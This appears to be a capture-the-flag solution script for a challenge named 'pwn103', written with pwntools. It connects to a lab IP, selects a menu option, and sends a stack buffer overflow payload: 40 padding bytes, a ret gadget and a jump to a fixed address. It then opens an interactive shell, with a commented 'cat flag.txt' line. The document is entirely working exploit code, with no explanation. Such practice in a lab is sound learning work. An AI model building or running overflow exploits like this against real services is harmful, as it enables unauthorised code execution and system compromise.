from pwn import *

p = remote('10.10.116.146',9003)
# p = process('./pwn103.pwn103')

payload = b'A'*40
payload += p64(0x401016) # ret
payload += p64(0x401554)

p.clean()
p.sendline('3')
p.clean()
p.sendline(payload)
# p.sendline('cat flag.txt')
print(p.clean())
p.interactive()
